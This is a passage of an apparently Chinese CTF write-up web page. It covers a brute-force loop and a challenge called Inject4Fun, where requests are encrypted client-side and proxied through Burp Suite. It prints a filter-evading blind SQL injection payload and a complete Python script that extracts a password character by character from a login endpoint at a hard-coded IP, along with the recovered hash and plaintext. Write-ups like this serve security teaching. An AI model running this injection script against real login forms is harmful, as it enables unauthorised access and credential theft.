        header<span class="token punctuation">[</span><span class="token string">&quot;Cookie&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> newcookie
        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">1000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;{&quot;</span> <span class="token keyword">in</span> data<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>达到99999即可得到flag</p> <h2 id="inject4fun"><a href="#inject4fun" class="header-anchor">#</a> Inject4Fun</h2> <p>可以通过查看 js 发现，前端随机生成 aes 秘钥，对数据包进行加密，然后再是用 rsa 公钥加密 aes 秘钥传输。知道算法后，可以直接写个 burpsuite 插件来，自动加密。</p> <p>为了简化代码，这里直接固定 key 的值，code 的值也就是 rsa 加密的结果也固定。</p> <p><img src="/assets/img/2019-gongce-2.3b59029a.png" alt="RSA"></p> <p>插件效果如下</p> <p><img src="/assets/img/2019-gongce-3.c059e237.png" alt="插件"></p> <p>通过手工测试发现，select、and、or之类的被过滤，于是尝试直接注入获得password字段Payload为<code>admin'^(1&lt;ord(substr(password,1,1)))='0</code></p> <p>然后根据这个写个脚本自动注入，这里是将请求发送到burpsuite，burpsuite会自动加密，然后再发送到服务端。Python代码为</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> requests

headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Linux; Android 4.4.2; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 MMWEBID/4009 MicroMessenger/7.0.3.1400(0x2700033B) Process/tools NetType/WIFI Language/zh_CN'</span>
           <span class="token punctuation">}</span>

URL <span class="token operator">=</span> <span class="token string">&quot;http://129.204.73.141:2000/login.php&quot;</span>
<span class="token keyword">def</span> <span class="token function">sendsort</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span><span class="token string">&quot;password&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;aaa&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;code&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;130a0f7568d93a7b1b7f304466a0c0e8a6abd167d45eab324fd042129ba499cf3347c69ac91da53a0205763930e10dd357835715d29bdfbe5c9ad01724244485f73dc935d5136ddd72ee9766f4351b367af89fccad72a456ced52553aedbaf56c2b7deee0506e96ed5e7f70ebdb2b69cacbb7725b2760fbee764d1c942bd3624&quot;</span><span class="token punctuation">}</span>
            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span>data<span class="token operator">=</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>proxies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;http&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;127.0.0.1:8080&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
           <span class="token keyword">break</span>

    <span class="token keyword">if</span> <span class="token string">&quot;password&quot;</span>   <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>

TEMPLATE <span class="token operator">=</span> <span class="token string">&quot;admin'^(%s&lt;ord(substr(password,%s,1)))='0&quot;</span>

data<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    min_value<span class="token operator">=</span> <span class="token number">31</span>
    max_value<span class="token operator">=</span> <span class="token number">128</span>
    <span class="token keyword">while</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>max_value<span class="token operator">-</span>min_value<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">:</span>
        mid_value <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>max_value<span class="token operator">+</span>min_value<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> sendsort<span class="token punctuation">(</span>TEMPLATE<span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid_value<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            min_value<span class="token operator">=</span> mid_value
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            max_value<span class="token operator">=</span> mid_value
    data<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>max_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><p>获得 password 的 md5 值为 6f1568e3698c06b9eb17b0e8e77444，
对应的明文为 admin123password321
登录之后获得 flag</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1eac7796.js" defer></script><script src="/assets/js/2.da4aa226.js" defer></script><script src="/assets/js/11.c5844bad.js" defer></script>
  </body>
</html>
